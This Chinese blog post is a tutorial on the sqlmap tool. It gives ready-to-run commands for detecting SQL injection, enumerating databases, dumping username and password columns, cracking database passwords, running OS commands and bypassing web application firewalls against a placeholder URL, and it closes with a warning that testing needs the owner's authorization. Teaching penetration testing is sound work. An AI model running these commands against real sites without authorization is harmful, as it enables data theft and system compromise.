---
layout: post
title: "Sqlmap注入工具简单解释"
date: 2025-03-14 18:53:19 +0800
description: "SQLMap 是基于 Python 开发的，所以要先安装 Python 环境。SQLMap 会自动检测该 URL 是否存在 SQL 注入漏洞，并尝试确定注入类型（如布尔型、时间型、联合查询型等）。"
keywords: "Sqlmap注入工具简单解释"
categories: ['安全测试']
tags: ['网络安全']
artid: "146265144"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146265144
    alt: "Sqlmap注入工具简单解释"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146265144
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146265144
cover: https://bing.ee123.net/img/rand?artid=146265144
image: https://bing.ee123.net/img/rand?artid=146265144
img: https://bing.ee123.net/img/rand?artid=146265144
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Sqlmap注入工具简单解释
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h4>
     <a id="_0">
     </a>
     安装
    </h4>
    <h5>
     <a id="1__Python_1">
     </a>
     1. 安装 Python
    </h5>
    <p>
     SQLMap 是基于 Python 开发的，所以要先安装 Python 环境。建议安装 Python 3.9 或更高版本，可从
     <a href="https://www.python.org/downloads/" rel="nofollow">
      Python 官方网站
     </a>
     下载对应操作系统的安装包，然后按照安装向导完成安装。
    </p>
    <h5>
     <a id="2__SQLMap_4">
     </a>
     2. 获取 SQLMap
    </h5>
    <p>
     可以从 SQLMap 的官方 GitHub 仓库克隆代码：
    </p>
    <pre><code class="prism language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span> <span class="token number">1</span> https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
</code></pre>
    <p>
     也可以直接从 GitHub 下载压缩包，解压到指定目录。
    </p>
    <h4>
     <a id="_11">
     </a>
     基本使用
    </h4>
    <h5>
     <a id="1__URL__12">
     </a>
     1. 检测单一 URL 的注入漏洞
    </h5>
    <p>
     使用
     <code>
      -u
     </code>
     参数指定目标 URL 进行注入检测：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span>
</code></pre>
    <p>
     SQLMap 会自动检测该 URL 是否存在 SQL 注入漏洞，并尝试确定注入类型（如布尔型、时间型、联合查询型等）。
    </p>
    <h5>
     <a id="2__Cookie__19">
     </a>
     2. 处理带有 Cookie 的请求
    </h5>
    <p>
     如果目标网站需要登录状态才能访问，可以使用
     <code>
      --cookie
     </code>
     参数传递 Cookie 信息：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"session_id=abcdef123456; user=testuser"</span>
</code></pre>
    <h5>
     <a id="3__POST__25">
     </a>
     3. 处理 POST 请求
    </h5>
    <p>
     对于使用 POST 方法提交数据的表单，可以使用
     <code>
      -d
     </code>
     参数指定 POST 数据：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/login.php"</span> <span class="token parameter variable">-d</span> <span class="token string">"username=test&amp;password=test"</span>
</code></pre>
    <h4>
     <a id="_31">
     </a>
     数据库信息获取
    </h4>
    <h5>
     <a id="1__32">
     </a>
     1. 列出所有数据库
    </h5>
    <p>
     若检测到注入漏洞，可使用
     <code>
      --dbs
     </code>
     参数列出目标数据库服务器上的所有数据库：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">--dbs</span>
</code></pre>
    <h5>
     <a id="2__38">
     </a>
     2. 列出指定数据库中的表
    </h5>
    <p>
     使用
     <code>
      -D
     </code>
     参数指定数据库名，
     <code>
      --tables
     </code>
     参数列出该数据库中的所有表：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">-D</span> testdb <span class="token parameter variable">--tables</span>
</code></pre>
    <h5>
     <a id="3__44">
     </a>
     3. 列出指定表中的列
    </h5>
    <p>
     使用
     <code>
      -T
     </code>
     参数指定表名，
     <code>
      --columns
     </code>
     参数列出该表中的所有列：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">-D</span> testdb <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--columns</span>
</code></pre>
    <h5>
     <a id="4__50">
     </a>
     4. 提取数据
    </h5>
    <p>
     使用
     <code>
      -C
     </code>
     参数指定要提取的列名，
     <code>
      --dump
     </code>
     参数提取数据：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">-D</span> testdb <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">-C</span> username,password <span class="token parameter variable">--dump</span>
</code></pre>
    <h4>
     <a id="_56">
     </a>
     高级功能
    </h4>
    <h5>
     <a id="1__57">
     </a>
     1. 暴力破解数据库密码
    </h5>
    <p>
     使用
     <code>
      --passwords
     </code>
     参数可以尝试暴力破解数据库用户的密码：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">--passwords</span>
</code></pre>
    <h5>
     <a id="2__63">
     </a>
     2. 执行系统命令（仅适用于支持的数据库）
    </h5>
    <p>
     对于某些数据库（如 MySQL），可以使用
     <code>
      --os-cmd
     </code>
     参数执行系统命令：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> --os-cmd<span class="token operator">=</span><span class="token string">"ls -l"</span>
</code></pre>
    <h5>
     <a id="3__WAFWeb__69">
     </a>
     3. 绕过 WAF（Web 应用防火墙）
    </h5>
    <p>
     使用
     <code>
      --tamper
     </code>
     参数可以指定一些绕过 WAF 的脚本，例如使用
     <code>
      apostrophemask
     </code>
     脚本来绕过对单引号的过滤：
    </p>
    <pre><code class="prism language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://example.com/vulnerable_page.php?id=1"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>apostrophemask
</code></pre>
    <h4>
     <a id="_75">
     </a>
     注意事项
    </h4>
    <ul>
     <li>
      <strong>
       合法性
      </strong>
      ：必须在获得目标系统所有者明确授权的情况下使用 SQLMap 进行测试，未经授权的渗透测试属于违法行为。
     </li>
     <li>
      <strong>
       数据安全
      </strong>
      ：在测试过程中，要注意避免对目标系统造成数据损坏、服务中断等不良影响。
     </li>
     <li>
      <strong>
       性能影响
      </strong>
      ：SQLMap 的某些操作可能会对目标系统造成较大的性能压力，建议在非生产环境或低峰期进行测试。
     </li>
     <li>
      <strong>
       防护机制
      </strong>
      ：对于一些使用了高级防护机制的网站，SQLMap 可能无法直接检测到注入漏洞，需要结合其他技术和工具进行分析。
     </li>
    </ul>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f34393036343435382f:61727469636c652f64657461696c732f313436323635313434" class_="artid" style="display:none">
 </p>
</div>


